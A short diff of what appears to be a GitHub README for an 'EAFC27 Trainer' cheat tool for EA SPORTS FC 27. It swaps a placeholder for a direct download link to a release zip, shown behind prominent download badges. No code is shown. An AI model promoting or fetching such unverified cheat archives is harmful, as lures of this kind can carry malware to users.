@@ -6,7 +6,7 @@
 
 <br/>
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/DeanCompress/eafc27-panel/releases/download/v1.0.0/EAFC27_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20eafc27--trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
@@ -155,7 +155,7 @@ Game:    EA SPORTS FC 27 (latest Steam / EA App version)
 
 <div align="center">
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/DeanCompress/eafc27-panel/releases/download/v1.0.0/EAFC27_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20eafc27--trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
